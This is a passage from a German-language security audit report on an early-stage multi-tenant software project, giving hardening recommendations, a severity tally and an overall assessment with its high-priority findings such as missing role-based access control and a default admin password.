8. **Kubernetes Pod-Disruption-Budget**: Ein PodDisruptionBudget sollte konfiguriert werden, um die Verfügbarkeit während Rolling Updates zu gewährleisten.

9. **Dependency-Pinning**: Docker-Images in `docker-compose.yml` sollten exakte Versionen verwenden statt `latest` (z.B. `kafka-ui`).

10. **CDN-Integrität**: Die externen JavaScript-Bibliotheken (highlight.js, mermaid) sollten mit Subresource Integrity (SRI) Hashes eingebunden werden, um Supply-Chain-Angriffe zu verhindern.

## Zusammenfassung

| Severity      | Anzahl |
| ------------- | ------ |
| Critical      | 0      |
| High          | 4      |
| Medium        | 6      |
| Low           | 3      |
| Informational | 3      |

**Gesamtbewertung:** Das Projekt befindet sich in einer frühen Entwicklungsphase (Meilenstein 1) und weist für diesen Stand eine solide Sicherheitsarchitektur auf. Die hexagonale Architektur sorgt für klare Schichtentrennung, die Kubernetes-Infrastruktur enthält NetworkPolicies und TLS-Terminierung, und Secrets werden mit SOPS/age verschlüsselt.

Die vier High-Findings sollten vor einem Produktions-Release adressiert werden:
1. **Rollenbasierte API-Zugriffskontrolle** einführen
2. **User-Management-Service absichern** (Spring Security oder Service-Mesh-Auth)
3. **HTML-Sanitisierung** für Markdown-Output implementieren
4. **Default-Admin-Passwort** entfernen oder Startup-Prüfung einbauen

Die Medium-Findings (Tenant-Header-Validierung, gRPC-TLS, CSRF, Swagger-UI, K8s-SecurityContext, Audit-Felder) sind für die geplante Produktionsreife ebenfalls relevant, können aber phasenweise behoben werden. Die Multi-Tenant-Isolation über den `X-Tenant-Id`-Header ist als Phase-1-Lösung dokumentiert (ADR-0012 sieht domain-basierte Auflösung vor), sollte aber durch Validierung gegen die Benutzermitgliedschaften gehärtet werden.
